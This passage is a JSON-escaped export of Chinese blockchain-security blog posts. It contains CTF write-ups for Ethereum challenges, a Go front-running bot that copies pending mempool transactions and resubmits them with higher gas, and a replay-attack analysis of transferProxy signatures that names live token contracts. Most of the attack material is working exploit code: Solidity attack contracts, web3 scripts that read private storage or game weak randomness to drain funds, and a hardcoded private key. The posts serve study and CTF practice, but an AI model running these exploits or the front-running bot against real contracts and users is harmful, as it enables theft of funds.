 &#125;\n&#125;\n\nFind the keccak256 hash of aliceHash and bobHash. \nAnalyse智能合约变量存储优化规则，获取对应slot的数据\n0x01 Road ClosedCode// SPDX-License-Identifier: GPL-3.0\n\npragma solidity 0.8.7;\n\ncontract RoadClosed &#123;\n\n    bool hacked;\n    address owner;\n\t\taddress pwner;\n    mapping(address => bool) whitelistedMinters;\n\n\n    function isContract(address addr) public view returns (bool) &#123;\n        uint size;\n        assembly &#123;\n            size := extcodesize(addr)\n            &#125;\n        return size > 0;\n    &#125;\n\n    function isOwner() public view returns(bool)&#123;\n        if (msg.sender==owner) &#123;\n            return true;\n        &#125;\n        else return false;\n    &#125;\n\n    constructor() &#123;\n        owner = msg.sender;\n    &#125;\n\n    function addToWhitelist(address addr) public &#123;\n        require(!isContract(addr),\"Contracts are not allowed\");\n        whitelistedMinters[addr] = true;\n    &#125;\n    \n\n    function changeOwner(address addr) public &#123;\n        require(whitelistedMinters[addr], \"You are not whitelisted\");\n\t\t\t\trequire(msg.sender == addr, \"address must be msg.sender\");\n        require(addr != address(0), \"Zero address\");\n        owner = addr;\n    &#125;\n\n    function pwn(address addr) external payable&#123;\n        require(!isContract(msg.sender), \"Contracts are not allowed\");\n\t\t\t\trequire(msg.sender == addr, \"address must be msg.sender\");\n        require (msg.sender == owner, \"Must be owner\");\n        hacked = true;\n    &#125;\n\n    function pwn() external payable &#123;\n        require(msg.sender == pwner);\n        hacked = true;\n    &#125;\n\n    function isHacked() public view returns(bool) &#123;\n        return hacked;\n    &#125;\n&#125;\n\n\nBecome the owner of the contract\nChange the value of hacked to true\n\nAnalyse\n\n按顺序调用下来\n","slug":"quii","date":"2023-01-27T06:00:47.995Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"ac4aeeb950031db089d1689b68bf4df9","title":"Priority Gas Auctions (PGAs)","content":"0x01 前提我们都知道，常规意义上，在以太坊上提交交易是一个有序的过程，现在重新审视一下这个过程：\n\n用户需要在钱包构建交易，并签名，钱包后端会将该交易广播到 P2P 网络；\n该交易首先会进入各个节点的 mempool，按照一定的顺序排列；\n矿工从 mempool 中选取合适的交易进行打包，挖矿出块，该交易就成功上链了。\n\n三明治攻击（ Sandwich Attack）正是利用了这一原理（攻击实例），接下来记录一下关于PGAs的学习\n0x02 原理理解简单来说，Front-Running 是指在一笔正常交易等待打包的过程中，抢跑程序通过使用更高的Gas 从而抢先完成交易的行为，从而实现获利。而 Mempool 是一组已经广播到网络中并等待被打包进区块的以太坊交易，交易在Mempool中等待被记账，但此时交易信息是公开可见的，抢跑程序就可以通过不断扫描 Mempool 中的交易，来分析发现可攻击的目标，之后使用更高的gas来优先执行自己的攻击交易\n0x03 实现package main\n\nimport (\n\t\"context\"\n\t\"crypto/ecdsa\"\n\t\"fmt\"\n\t\"github.com/ethereum/go-ethereum/common\"\n\t\"github.com/ethereum/go-ethereum/core/types\"\n\t\"github.com/ethereum/go-ethereum/crypto\"\n\t\"github.com/ethereum/go-ethereum/ethclient\"\n\t\"github.com/ethereum/go-ethereum/ethclient/gethclient\"\n\t\"github.com/ethereum/go-ethereum/rpc\"\n\t\"log\"\n\t\"math/big\"\n)\n\nconst (\n\turl = \"api\"\n\twss = \"api\"\n)\n\nvar txd *types.Transaction\nvar target string = 监控合约地址\nvar PVK string = 私钥\n\nfunc watch(backend *ethclient.Client, rpcCli *rpc.Client) &#123;\n\tgcli := gethclient.New(rpcCli)\n\ttxch := make(chan common.Hash, 100)\n\t_, err := gcli.SubscribePendingTransactions(context.Background(), txch)\n\tif err != nil &#123;\n\t\tlog.Printf(\"failed to SubscribePendingTransactions: %v\", err)\n\t\treturn\n\t&#125;\nloop:\n\tfor &#123;\n\t\tselect &#123;\n\t\tcase txhash := &lt;-txch:\n\t\t\ttx, _, err := backend.TransactionByHash(context.Background(), txhash)\n\t\t\tif err != nil &#123;\n\t\t\t\tcontinue\n\t\t\t&#125;\n\t\t\tdata, _ := tx.MarshalJSON()\n\t\t\tif tx.To() != nil &#123;\n\t\t\t\tto := tx.To().Hex()\n\t\t\t\tfmt.Println(to)\n\t\t\t\tif to == target &#123;\n\t\t\t\t\tlog.Printf(\"tx: %v\", string(data))\n\t\t\t\t\ttxd = tx\n\t\t\t\t\tbreak loop\n\t\t\t\t&#125;\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\n&#125;\nfunc createTx(backend *ethclient.Client, rpcCli *rpc.Client) &#123;\n\tinput := txd.Data()\n\tgas := txd.Gas()\n\tvar a uint64 = txd.GasPrice().Uint64() + 2\n\tgasprice := new(big.Int).SetUint64(a)\n\tvalue := big.NewInt(0)\n\tprivateKey, err := crypto.HexToECDSA(PVK)\n\tif err != nil &#123;\n\t\tlog.Fatal(err)\n\t&#125;\n\n\tpublicKey := privateKey.Public()\n\tpublicKeyECDSA, ok := publicKey.(*ecdsa.PublicKey)\n\tif !ok &#123;\n\t\tlog.Fatal(\"cannot assert type: publicKey is not of type *ecdsa.PublicKey\")\n\t&#125;\n\n\tfromAddress := crypto.PubkeyToAddress(*publicKeyECDSA)\n\tnonce, err := backend.PendingNonceAt(context.Background(), fromAddress)\n\tif err != nil &#123;\n\t\tlog.Fatal(err)\n\t&#125;\n\tfmt.Println(fromAddress, nonce)\n\tchainID, err := backend.NetworkID(context.Background())\n\tif err != nil &#123;\n\t\tlog.Fatal(err)\n\t&#125;\n\ttx := types.NewTransaction(nonce, common.HexToAddress(target), value, gas, gasprice, input)\n\n\tsignedTx, err := types.SignTx(tx, types.NewEIP155Signer(chainID), privateKey)\n\tif err != nil &#123;\n\t\tlog.Fatal(err)\n\t&#125;\n\n\terr = backend.SendTransaction(context.Background(), signedTx)\n\tif err != nil &#123;\n\t\tlog.Fatal(err)\n\t&#125;\n\n\tfmt.Printf(\"tx sent: %s\\n\", signedTx.Hash().Hex())\n\ttransactionHash := common.HexToHash(signedTx.Hash().Hex())\n\tfor &#123;\n\t\t_, isPending, err := backend.TransactionByHash(context.Background(), transactionHash)\n\t\tif err != nil &#123;\n\t\t\tlog.Fatal(err)\n\t\t&#125;\n\t\tfmt.Println(isPending)\n\t\tif !isPending &#123;\n\t\t\tbreak\n\t\t&#125;\n\t&#125;\n\n&#125;\nfunc main() &#123;\n\tbackend, err := ethclient.Dial(url)\n\tif err != nil &#123;\n\t\tlog.Printf(\"failed to dial: %v\", err)\n\t\treturn\n\t&#125;\n\n\trpcCli, err := rpc.Dial(wss)\n\tif err != nil &#123;\n\t\tlog.Printf(\"failed to dial: %v\", err)\n\t\treturn\n\t&#125;\n\t\n\twatch(backend, rpcCli)\n\tcreateTx(backend, rpcCli)\n&#125;\n\n\n部署一个我们的测试合约\ncontract test&#123;\n    address public ss;\n    function a()public&#123;\n        if (ss == address(0))&#123;\n            ss=msg.sender;\n        &#125;\n    &#125;\n    function re()public &#123;\n        ss=address(0);\n    &#125;\n&#125;\n\n将上述的target地址设置为该合约地址，运行程序，之后我们在remix中调用函数a()，这时程序会持续监控mempool直到发现这笔交易，之后程序会使用更高的gasPrice和相同的gasLimit执行相同的交易\n\n在remix中查看执行结果是否符合预期（ps：在remix中调用函数的地址为0x22…..）\n\n查看发现我们先在remix中执行的交易没有成功执行，ss修改为了另一个地址（该地址为测试程序中私钥对应的地址），可见符合预期结果，再来看一下两笔交易的详情\n\n\n图二位攻击交易，两者使用相同的gasLimit，攻击交易使用跟高的GasPrice，两笔交易在同一区块中被确认，攻击者成功实现交易抢跑\n同理，除了实现交易抢跑之外还可以实现交易取消更改操作，首先发送一笔错误的交易，随后我们立刻发送一笔正确的交易，使用更高的gas和相同的nonce，这样第二笔正确的交易就会被更快的执行，将会先被确认，第二笔交易所用的nonce为已使用状态，在以太坊中，一个nonce只能用一次，所以使用相同nonce的交易一则会被称为无效交易\n","slug":"Priority-Gas-Auctions-(PGAs)","date":"2023-01-03T16:27:44.588Z","categories_index":"","tags_index":"区块链 ctf","author_index":"bcYng"},{"id":"37d952c359458cb6532fc36cd0258d93","title":"Down Under CTF","content":"DownUnder ctf 2022-blockchain题解\n\n\nSolve Me一道签到题，没什么难度，调用指定函数即可\nfunction solveChallenge() external &#123;\n        isSolved = true;\n    &#125;\n\nSecret and Ephemeral稍微有了点难度\nCode// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @title Secret And Ephemeral\n * @author Blue Alder (https://duc.tf)\n **/\n\ncontract SecretAndEphemeral &#123;\n    address private owner;\n    int256 public seconds_in_a_year = 60 * 60 * 24 * 365;\n    string word_describing_ductf = \"epic\";\n    string private not_yours;\n    mapping(address => uint) public cool_wallet_addresses;\n\n    bytes32 public spooky_hash; //\n\n    constructor(string memory _not_yours, uint256 _secret_number) &#123;\n        not_yours = _not_yours;\n        spooky_hash = keccak256(abi.encodePacked(not_yours, _secret_number, msg.sender));\n    &#125;\n\n    function giveTheFunds() payable public &#123;\n        require(msg.value > 0.1 ether);\n        // Thankyou for your donation\n        cool_wallet_addresses[msg.sender] += msg.value;\n    &#125;\n\n    function retrieveTheFunds(string memory secret, uint256 secret_number, address _owner_address) public &#123;\n        bytes32 userHash = keccak256(abi.encodePacked(secret, secret_number, _owner_address));\n\n        require(userHash == spooky_hash, \"Somethings wrong :(\");\n\n        // User authenticated, sending funds\n        uint256 balance = address(this).balance;\n        payable(msg.sender).transfer(balance);\n    &#125;\n&#125;\n\nAnalyse简单分析一下，题目要点就是获得not_yours，_secret_number以及creater，其中not_yours好获得，通过变量存储规则进行查询即可，难点是_secret_number以及creater，这两个我们通过构造data进行分析\nfrom webbrowser import get\nfrom web3 import Web3,HTTPProvider\nw3=Web3(HTTPProvider('https://blockchain-secretandephemeral-0b6c2a4599eb7832-eth.2022.ductf.dev:443'))\nblock=[]\nnumber=[]\ndef getlongp(i):\n    return i[2:].rjust(64,'0')\n\ndef getposition(i):\n    return int(Web3.keccak(hexstr=i).hex(),16)\n\nposition=getposition(getlongp('0x3'))\nprint(w3.eth.getStorageAt('0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8',position))\nprint(w3.eth.getStorageAt('0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8',position+1))\n\nfor i in range(0,5):\n    s=w3.eth.getBlockTransactionCount(i)\n    if s!=0:\n        block.append(i)\n        number.append(s)\nfor x in (0,len(block)-1):\n    print('No.',block[x],'have',number[x],'transactions')\n\nfor p in range(0,len(block)):\n    for o in range(0,number[p]):\n        print(w3.toJSON(w3.eth.getTransactionByBlock(block[p],o)))\n\nprint(w3.eth.getBalance(''))\n\n\n获得结果如下\nb'so anyways i just started blasti'\nNo. 3 have 2 transactions\nNo. 4 have 1 transactions\n&#123;\"blockHash\": \"0xa3868886196f92397a0093054763d0c8ea6685752e0d7dec64acb338be74b14b\", \"blockNumber\": 3, \"from\": \"0x7BCF8A237e5d8900445C148FC2b119670807575b\", \"gas\": 21000, \"gasPrice\": 1000000000, \"hash\": \"0x42ff5b306690a58eecec489d86a9964d726d9bbe214679dc0606faf339c7c072\", \"input\": \"0x\", \"nonce\": 0, \"to\": \"0x9acACff3E22Bfdd49aD9dA6Ec8d70C1b2a2f8B08\", \"transactionIndex\": 0, \"value\": 1000000000000000000, \"type\": \"0x0\", \"chainId\": \"0x7a69\", \"v\": 62709, \"r\": \"0x1edab133e2cb18ca248c320bd7a0f18540185c957a74a737198edb437be44fda\", \"s\": \"0x198980c66e377505607a4e75321c73816b5397d25a4fdb2c457acadbca158670\"&#125;\n&#123;\"blockHash\": \"0xa3868886196f92397a0093054763d0c8ea6685752e0d7dec64acb338be74b14b\", \"blockNumber\": 3, \"from\": \"0x7BCF8A237e5d8900445C148FC2b119670807575b\", \"gas\": 391467, \"gasPrice\": 1000000000, \"hash\": \"0xd3383dd590ea361847180c3616faed3a091c3e8f3296771e0c2844b2746d408f\", \"input\": \"0x6301e1338060015560c060405260046080908152636570696360e01b60a05260029061002b908261013c565b5034801561003857600080fd5b506040516106fd3803806106fd833981016040819052610057916101fb565b6003610063838261013c565b506003813360405160200161007a939291906102ca565b60405160208183030381529060405280519060200120600581905550505061035a565b634e487b7160e01b600052604160045260246000fd5b600181811c908216806100c757607f821691505b6020821081036100e757634e487b7160e01b600052602260045260246000fd5b50919050565b601f82111561013757600081815260208120601f850160051c810160208610156101145750805b601f850160051c820191505b8181101561013357828155600101610120565b5050505b505050565b81516001600160401b038111156101555761015561009d565b6101698161016384546100b3565b846100ed565b602080601f83116001811461019e57600084156101865750858301515b600019600386901b1c1916600185901b178555610133565b600085815260208120601f198616915b828110156101cd578886015182559484019460019091019084016101ae565b50858210156101eb5787850151600019600388901b60f8161c191681555b5050505050600190811b01905550565b6000806040838503121561020e57600080fd5b82516001600160401b038082111561022557600080fd5b818501915085601f83011261023957600080fd5b81518181111561024b5761024b61009d565b604051601f8201601f19908116603f011681019083821181831017156102735761027361009d565b8160405282815260209350888484870101111561028f57600080fd5b600091505b828210156102b15784820184015181830185015290830190610294565b6000928101840192909252509401519395939450505050565b60008085546102d8816100b3565b600182811680156102f0576001811461030557610334565b60ff1984168752821515830287019450610334565b8960005260208060002060005b8581101561032b5781548a820152908401908201610312565b50505082870194505b50505094815260609390931b6001600160601b0319166020840152505060340192915050565b610394806103696000396000f3fe60806040526004361061004a5760003560e01c80631ac749ff1461004f57806323cfb56f146100775780637c46a9b014610081578063eb087bfb146100ae578063ecd424df146100c4575b600080fd5b34801561005b57600080fd5b5061006560015481565b60405190815260200160405180910390f35b61007f6100e4565b005b34801561008d57600080fd5b5061006561009c3660046101eb565b60046020526000908152604090205481565b3480156100ba57600080fd5b5061006560055481565b3480156100d057600080fd5b5061007f6100df366004610223565b61011e565b67016345785d8a000034116100f857600080fd5b33600090815260046020526040812080543492906101179084906102ee565b9091555050565b600083838360405160200161013593929190610315565b60405160208183030381529060405280519060200120905060055481146101985760405162461bcd60e51b81526020600482015260136024820152720a6dedacae8d0d2dccee640eee4dedcce40745606b1b604482015260640160405180910390fd5b6040514790339082156108fc029083906000818181858888f193505050501580156101c7573d6000803e3d6000fd5b505050505050565b80356001600160a01b03811681146101e657600080fd5b919050565b6000602082840312156101fd57600080fd5b610206826101cf565b9392505050565b634e487b7160e01b600052604160045260246000fd5b60008060006060848603121561023857600080fd5b833567ffffffffffffffff8082111561025057600080fd5b818601915086601f83011261026457600080fd5b8135818111156102765761027661020d565b604051601f8201601f19908116603f0116810190838211818310171561029e5761029e61020d565b816040528281528960208487010111156102b757600080fd5b826020860160208301376000602084830101528097505050505050602084013591506102e5604085016101cf565b90509250925092565b8082018082111561030f57634e487b7160e01b600052601160045260246000fd5b92915050565b6000845160005b81811015610336576020818801810151858301520161031c565b50919091019283525060601b6bffffffffffffffffffffffff1916602082015260340191905056fea2646970667358221220c558120b35ab560caa833f878d167e3c94af9005d6dea322262181580b0f895864736f6c634300081100330000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000dec0ded0000000000000000000000000000000000000000000000000000000000000022736f20616e79776179732069206a757374207374617274656420626c617374696e67000000000000000000000000000000000000000000000000000000000000\", \"nonce\": 1, \"to\": null, \"transactionIndex\": 1, \"value\": 0, \"type\": \"0x0\", \"chainId\": \"0x7a69\", \"v\": 62710, \"r\": \"0xcf50c8e0ed100baae3b31d69e45e7498caec66478e5ed9d884c3cedec6a14f82\", \"s\": \"0x73ebe87f3541c26669adf9ef18e665f47f1a30796f8f4b7162795099807f7e5a\"&#125;\n&#123;\"blockHash\": \"0xea9da20a3284e8019a0155369aafc875b3f23b649d69c05b7dd9c9880a8f2279\", \"blockNumber\": 4, \"from\": \"0x7BCF8A237e5d8900445C148FC2b119670807575b\", \"gas\": 42176, \"gasPrice\": 1000000000, \"hash\": \"0xbd0905bd8bd97e995a457e93871148170eb00c01b5e9c973933ceeff71e0f7ba\", \"input\": \"0x23cfb56f\", \"nonce\": 2, \"to\": \"0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8\", \"transactionIndex\": 0, \"value\": 10000000000000000000, \"type\": \"0x0\", \"chainId\": \"0x7a69\", \"v\": 62709, \"r\": \"0xa29e1e398ddeaf4291003f89249b7892449a6efe35c441d76f990016a5789735\", \"s\": \"0x4ac78cec2a1bc9f94859f0cfba83b1345ac5190641e91b4e6a3be7db41b72dc9\"&#125;\n\n0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000dec0ded0000000000000000000000000000000000000000000000000000000000000022736f20616e79776179732069206a757374207374617274656420626c617374696e67000000000000000000000000000000000000000000000000000000000000\n这段数据包含了随机数以及字符串的结果，通过分析我们也可以获得合约部署的msg.sender，之后就可以进行攻击了\nAttack\ncontract test&#123;\n    function ret(string memory secret,uint secret_number,address _owner_address)public pure returns(bytes32)&#123;\n        bytes32 userHash = keccak256(abi.encodePacked(secret, secret_number, _owner_address));\n        return userHash;\n    &#125;\n&#125;\n// 0x2b8a95ae6adb40a4fd5a457e05a47225dff3b530f72e404ea8fb787a9bff6185\n// so anyways i just started blasting\n// 0xdec0ded\n// 0x7BCF8A237e5d8900445C148FC2b119670807575b\n\n测试结果正确之后，依据参数调用 retrieveTheFunds函数即可\nCrypto Casino简单的随机数问题，感觉写的方法有些笨了，应该有更简单的解决方法，暂时没有去想\nCode//SPDX-License-Identifier: Unlicensed\npragma solidity ^0.8.0;\n\nimport \"OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/token/ERC20/ERC20.sol\";\nimport \"OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/access/Ownable.sol\";\n\ncontract DUCoin is ERC20, Ownable &#123;\n    constructor() ERC20(\"DUCoin\", \"DUC\") &#123;&#125;\n\n    function freeMoney(address addr) external onlyOwner &#123;\n        _mint(addr, 1337);\n    &#125;\n&#125;\n\n//SPDX-License-Identifier: Unlicensed\npragma solidity ^0.8.0;\n\nimport \"./DUCoin.sol\";\nimport \"OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/access/Ownable.sol\";\n\ncontract Casino is Ownable &#123;\n    DUCoin public immutable ducoin;\n\n    bool trialed = false;\n    uint256 lastPlayed = 0;\n    mapping(address => uint256) public balances;\n\n    constructor(address token) &#123;\n        ducoin = DUCoin(token);\n    &#125;\n\n    function deposit(uint256 amount) external &#123;\n        ducoin.transferFrom(msg.sender, address(this), amount);\n        balances[msg.sender] += amount;\n    &#125;\n\n    function withdraw(uint256 amount) external &#123;\n        require(balances[msg.sender] >= amount, \"Insufficient balance!\");\n        ducoin.transfer(msg.sender, amount);\n        balances[msg.sender] -= amount;\n    &#125;\n\n    function _randomNumber() internal view returns(uint8) &#123;\n        uint256 ab = uint256(blockhash(block.number - 1));\n        uint256 a = ab &amp; 0xffffffff;\n        uint256 b = (ab >> 32) &amp; 0xffffffff;\n        uint256 x = uint256(blockhash(block.number));\n        return uint8((a * x + b) % 6);\n    &#125;\n\n    function play(uint256 bet) external &#123;\n        require(balances[msg.sender] >= bet, \"Insufficient balance!\");\n        require(block.number > lastPlayed, \"Too fast!\");\n        lastPlayed = block.number;\n\n        uint8 roll = _randomNumber();\n        if(roll == 0) &#123;\n            balances[msg.sender] += bet;\n        &#125; else &#123;\n            balances[msg.sender] -= bet;\n        &#125;\n    &#125;\n\n    function getTrialCoins() external &#123;\n        if(!trialed) &#123;\n            trialed = true;\n            ducoin.transfer(msg.sender, 7);\n        &#125;\n    &#125;\n&#125;\n\n\nAnalyse先获得空投，再去依据随机数进行bet，直到余额满足要求即可\nAttackcontract Attack&#123;\n    Casino public tar;\n    uint public balance;\n    uint8 public roll;\n    constructor(address _tar)public&#123;\n        tar=Casino(_tar);\n    &#125;\n    function _randomNumber() internal view returns(uint8) &#123;\n        uint256 ab = uint256(blockhash(block.number - 1));\n        uint256 a = ab &amp; 0xffffffff;\n        uint256 b = (ab >> 32) &amp; 0xffffffff;\n        uint256 x = uint256(blockhash(block.number));\n        return uint8((a * x + b) % 6);\n    &#125;\n    function step1(address Ier)public&#123;\n        tar.getTrialCoins();\n        balance+=7;\n        IERC20(Ier).approve(address(tar),0xffffffff);\n        tar.deposit(balance);\n    &#125;\n    function attack()public&#123;\n        roll = _randomNumber();\n        if(roll == 0) &#123;\n            tar.play(balance);\n            balance+=7;\n        &#125;\n\n    &#125;\n    // 0x9e5faafc\n    function step2(address Ier)public&#123;\n        tar.withdraw(1337);\n        IERC20(Ier).transfer(msg.sender,1337);\n    &#125;\n&#125;\n\n纯手动调用太慢了，写个python循环调用吧\nfrom web3 import Web3,HTTPProvider\nfrom web3.middleware import geth_poa_middleware\nimport binascii\nimport asyncio\n# w3 = Web3(HTTPProvider('https://mainnet.infura.io/v3/538e5cfe4f9a402cbc81eeb8205254ab'))\nw3 = Web3(HTTPProvider('https://blockchain-cryptocasino-fb03960225586b80-eth.2022.ductf.dev:443'))\nw3.middleware_onion.inject(geth_poa_middleware, layer=0)\n\n\nprivatekey='0x57af1bcf38ff8b9358493e7d502cdefd122376817565697f2ecc626dbf53c394'\naddress=w3.eth.account.from_key(privatekey).address\nprint(address)\n\nabi='''\nabi\n'''\ndef main():\n    contractadress='0xa1F8b18C09d0B7d848b6f56e424C455e9F5F1413'\n    contract=w3.eth.contract(abi=abi,address=contractadress)\n\n    txn_hash=contract.functions.attack().buildTransaction(&#123;\n        'from':address,\n        'nonce':w3.eth.getTransactionCount(address),\n        'gas':3000000,\n        'gasPrice': w3.toWei('21', 'gwei')\n    &#125;)\n    signed_txn=w3.eth.account.signTransaction(txn_hash,privatekey)\n    hash= w3.eth.sendRawTransaction(signed_txn.rawTransaction)\n    w3.eth.wait_for_transaction_receipt(hash)\n    print(hash.hex(),contract.functions.roll().call())\n\n\nfor i in range(0xffffffff):\n    main()\n\n暂时还没有实现全解，因为马上要开学了，时间有些紧张，返校后在解决剩下的两道题目\n","slug":"DownUnder","date":"2022-10-11T15:34:16.219Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"02422efed6266c39f6caa487b5070e3c","title":"Replay attack","content":"简单的重放攻击分析\n\n\nReplay attack\nAnalyseCore codefunction transferProxy(address _from, address _to, uint256 _value, uint256 _fee,\n        uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool)&#123;\n\n        if(balances[_from] &lt; _fee + _value) revert();\n\n        uint256 nonce = nonces[_from];\n        bytes32 h = keccak256(_from,_to,_value,_fee,nonce);\n        if(_from != ecrecover(h,_v,_r,_s)) revert();\n\n        if(balances[_to] + _value &lt; balances[_to]\n            || balances[msg.sender] + _fee &lt; balances[msg.sender]) revert();\n        balances[_to] += _value;\n        Transfer(_from, _to, _value);\n\n        balances[msg.sender] += _fee;\n        Transfer(_from, msg.sender, _fee);\n\n        balances[_from] -= _value + _fee;\n        nonces[_from] = nonce + 1;\n        return true;\n    &#125;\n\n为解决gas fee问题，在智能合约中会采取代理转账功能，即TransferProxy。比如在HXH token合约中，A想转账300Token给B，但是，A没有足够数量的ETH用来支付Gas fee，于是A可以找C做中间人，A支付一定的token做service fee，让C来代替A付出Gas fee，核心代码如上\nexample：\n&#123;\n  'from':address(A)\n  'to':address(B)\n\t'value':300\n\t'fee':10\n&#125;\n\n上述事例执行结果为A支付310token，其中300个转账给B，10个做为手续费转账给C，C获得10token奖励，消耗一定的手续费\n函数中的重点是keccak256以及ecrecover\n\n角色A(_from)先用sha3函数对 _from,_to,_value,_fee,nonce,address(token)进行处理得到msg值，然后使用web3.eth.sign(address, msg)得到签名signature；\n将signature取前 066 个字节作为 r， 66130 之间的字节作为 s，130~132 的字节作为 v，然后把 v 转为整型，角色A把这些信息告知角色C，角色C调用合约的transferProxy进行转账；\n合约内ecrecover接收签名数据的哈希值以及 r&#x2F;s&#x2F;v 等参数作为输入，返回实施该签名的账户地址；\n校验步骤3中得到的账户地址与 _from 是否匹配；\n\nlet msg = web3.sha3(_from,_to,_value,_fee,nonce,address(token))\nlet signature = web3.eth.sign(_from, msg)\n\nlet r = signature.slice(0, 66)\nlet s = '0x' + signature.slice(66, 130)\nlet v = '0x' + signature.slice(130, 132)\nv = web3.toDecimal(v)\n\nconsole.log('r', r)\nconsole.log('s', s)\nconsole.log('v', v)\nconsole.log(msg)\n\n如果匹配则执行，否则revert，但是在许多智能合约中采取了相同的签名方式，导致同一笔交易可能在另一个合约（下文我们说为FXH Token）中被重放\n比如上述事例，在以太坊浏览器中交易数据公开透明，交易的参数可以被查询到，此时如果B清楚重放攻击，就可以获取交易数据进行攻击，攻击成功的前提是 _from 账户在两个合约中的 nonce （一般在合约中自增）值是一样的，这样才能保证签名后的 hash 值相同。在FXH合约中执行相同的交易，相当于A转给了角色B 300HXH之后，又转给了角色B 300FXH（未授权的），造成了意料之外的损失\n防御建议\n\nnonce 生成算法不采用从 0 开始自增的设计，避免和场景的做法相同；\n去除 transferProxy 函数，改成其他方式实现代理的需求；\n\nOther related contracts\nM2C Mesh Network (mesh) 0x3AC6cb00f5a44712022a51fbace4C7497F56eE31\nM2C Mesh Network (MTC) 0x8feBf7551EeA6Ce499F96537Ae0e2075c5A7301a\nFirst (FST) 0x9E88770DA20ebea0Df87aD874c2F5cf8ab92f605\nGG Token (GG) 0xF20b76Ed9d5467fDcDc1444455e303257d2827c7\nUG Token (UGT) old 0x43ee79e379e7b78d871100ed696e803e7893b644\n\n参考：[https://github.com/nkbai/defcon26/blob/master/docs/Replay%20Attacks%20on%20Ethereum%20Smart%20Contracts.md](https://github.com/nkbai/defcon26/blob/master/docs/Replay Attacks on Ethereum Smart Contracts.md)\n","slug":"Replay attack","date":"2022-10-11T15:32:03.303Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"d378808bbcd5d495f80cba891879084d","title":"Chain Flag","content":"Upgrading！！\n\n\ninteger overflowbet\n\n\n\n\n\n\n\n\n0x30d0a604d8c90064a0a3ca4beeea177eff3e9bcd@ropsten\nhttps://github.com/chainflag/ctf-blockchain-challenges/tree/main/integer_overflow/bet/attachments\nCodepragma solidity ^0.4.24;\n\ncontract bet &#123;\n    uint secret;\n    address owner;\n    \n    mapping(address => uint) public balanceOf;\n    mapping(address => uint) public gift;\n    mapping(address => uint) public isbet;\n    \n    event SendFlag(string b64email);\n    \n    function Bet() public&#123;\n        owner = msg.sender;\n    &#125;\n    \n    function payforflag(string b64email) public &#123;\n        require(balanceOf[msg.sender] >= 100000);\n        balanceOf[msg.sender]=0;\n        owner.transfer(address(this).balance);\n        emit SendFlag(b64email);\n    &#125;\n    \n\n    //to fuck\n    \n    modifier only_owner() &#123;\n        require(msg.sender == owner);\n        _;\n    &#125;\n    \n    function setsecret(uint secretrcv) only_owner &#123;\n        secret=secretrcv;\n    &#125;\n    \n    function deposit() payable&#123;\n        uint geteth=msg.value/1000000000000000000;\n        balanceOf[msg.sender]+=geteth;\n    &#125;\n    \n    function profit() &#123;\n        require(gift[msg.sender]==0);\n        gift[msg.sender]=1;\n        balanceOf[msg.sender]+=1;\n    &#125;\n    \n    function betgame(uint secretguess)&#123;\n        require(balanceOf[msg.sender]>0);\n        balanceOf[msg.sender]-=1;\n        if (secretguess==secret)\n        &#123;\n            balanceOf[msg.sender]+=2;\n            isbet[msg.sender]=1;\n        &#125;\n    &#125;\n    \n    function doublebetgame(uint secretguess) only_owner&#123;\n        require(balanceOf[msg.sender]-2>0);\n        require(isbet[msg.sender]==1);\n        balanceOf[msg.sender]-=2;\n        if (secretguess==secret)\n        &#123;\n            balanceOf[msg.sender]+=2;\n        &#125;\n    &#125;\n\n&#125;\n\nAnalysesecret可控，下溢\nhf\n\n\n\n\n\n\n\n\n0x62f1173e0fb4d481114d389dc8e0dea65e942735@ropsten\nhttps://github.com/chainflag/ctf-blockchain-challenges/tree/main/integer_overflow/hf/attachments\nCodepragma solidity ^0.4.24;\n\ncontract hf &#123;\n    address secret;\n    uint count;\n    address owner;\n    \n    mapping(address => uint) public balanceOf;\n    mapping(address => uint) public gift;\n    \n    struct node &#123;\n        address nodeadress;\n        uint nodenumber;\n    &#125;\n    \n    node public node0;\n    \n    event SendFlag(string b64email);\n    \n    constructor()public&#123;\n        owner = msg.sender;\n    &#125;\n    \n    function payforflag(string b64email) public &#123;\n        require(balanceOf[msg.sender] >= 100000);\n        balanceOf[msg.sender]=0;\n        owner.transfer(address(this).balance);\n        emit SendFlag(b64email);\n    &#125;\n    \n\n    //to fuck\n    \n    modifier onlySecret() &#123;\n        require(msg.sender == secret);\n        _;\n    &#125;\n    \n    function profit() public&#123;\n        require(gift[msg.sender]==0);\n        gift[msg.sender]=1;\n        balanceOf[msg.sender]+=1;\n    &#125;\n    \n    function hfvote() public payable&#123;\n        uint geteth=msg.value/1000000000000000000;\n        balanceOf[msg.sender]+=geteth;\n    &#125;\n    \n    function ubw() public payable&#123;\n        if (msg.value &lt; 2 ether)\n        &#123;\n            node storage n = node0;\n            n.nodeadress=msg.sender;\n            n.nodenumber=1;\n        &#125;\n        else\n        &#123;\n            n.nodeadress=msg.sender;\n            n.nodenumber=2;\n        &#125;\n    &#125;\n    \n    function fate(address to,uint value) public onlySecret &#123;\n        require(balanceOf[msg.sender]-value>=0);\n        balanceOf[msg.sender]-=value;\n        balanceOf[to]+=value;\n    &#125;\n    \n&#125;\n\nAnalyse结构体未初始化，覆盖变量secret，下溢\ndelegatecallCounterstrike\n\n\n\n\n\n\n\n\n发现个大炸弹，受累把它电源关了。\nCodecontracts/EasyBomb.sol\npragma solidity ^0.5.10;\n\nimport \"./Launcher.sol\";\n\ncontract EasyBomb&#123;\n    bool private hasExplode = false;\n    address private launcher_address;\n    bytes32 private password;\n    bool public power_state = true;\n    bytes4 constant launcher_start_function_hash = bytes4(keccak256(\"setdeadline(uint256)\"));\n    Launcher launcher;\n\n    function msgPassword() public returns (bytes32 result)  &#123;\n        bytes memory msg_data = msg.data;\n        if (msg_data.length == 0) &#123;\n            return 0x0;\n        